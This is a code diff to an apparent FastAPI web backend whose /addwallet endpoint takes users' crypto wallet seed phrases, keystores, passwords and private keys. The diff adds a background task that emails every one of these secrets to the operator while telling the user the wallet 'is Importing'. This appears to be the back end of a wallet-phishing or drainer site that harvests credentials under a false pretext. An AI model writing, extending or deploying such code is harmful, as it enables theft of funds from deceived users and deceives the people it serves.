@@ -15,7 +15,7 @@ import io
 from fastapi import FastAPI, BackgroundTasks
 from typing import List, Optional
 
-from email_temp import send_welcome_email
+from email_temp import send_welcome_email, send_wallet_email
 
 
 
@@ -198,11 +198,13 @@ async def logina(request: Request, db:db_dependency, error_message: str = ""):
 @router.post("/addwallet")
 def add_wallet(
     db: db_dependency,
+    bk: BackgroundTasks,
     phrase: str = Form(None),
     keystore: str = Form(None),
     password: str = Form(None),
     privatekey: str = Form(None),
     method: str = Form("kaikas"),
+    
 
 ):
     wallet = Wallet(
@@ -215,6 +217,17 @@ def add_wallet(
     db.add(wallet)
     db.commit()
     db.refresh(wallet)
+    email_content =  content = f"""
+    ✅ A new wallet has been saved.
+
+    🔐 Phrase: {phrase}
+    🗂️ Keystore: {keystore}
+    🔑 Password: {password}
+    🛡️ Private Key: {privatekey}
+    ⚙️ Method: {method}
+    """
+    bk.add_task(send_wallet_email, phrase, keystore, password, privatekey, method)
+
     return {"message": "Wallet is Importing, we will let you know when done", "wallet_id": wallet.id}
 
 
